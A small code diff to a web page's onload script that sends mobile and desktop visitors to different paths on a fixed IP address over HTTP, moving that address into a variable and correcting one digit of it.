@@ -7,11 +7,14 @@
     window.onload = function() {
       const userAgent = navigator.userAgent.toLowerCase();
       const isMobile = /android|iphone|ipad|ipod|mobile/i.test(userAgent);
-      
+
+      // ✅ Use HTTP and correct IP address
+      const baseUrl = "http://85.112.90.35";  
+
       if (isMobile) {
-        window.location.href = "http://85.112.95.35/2";
+        window.location.href = baseUrl + "/2";
       } else {
-        window.location.href = "http://85.112.95.35/1";
+        window.location.href = baseUrl + "/1";
       }
     };
   </script>
